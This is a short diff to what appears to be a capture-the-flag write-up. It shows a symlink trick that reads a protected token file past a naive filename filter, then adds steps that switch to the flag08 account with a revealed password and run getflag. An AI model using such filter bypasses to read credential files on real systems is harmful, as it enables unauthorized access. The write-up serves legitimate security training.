@@ -15,4 +15,10 @@ ln -sf /home/user/level08/token /tmp/tok
 ./level08 /tmp/tok
 ```
 
+```bash
+su flag08
+password: quif5eloekouj29ke0vouxean
+getflag
+```
+
 You still read the real file, while bypassing the naive string filter.
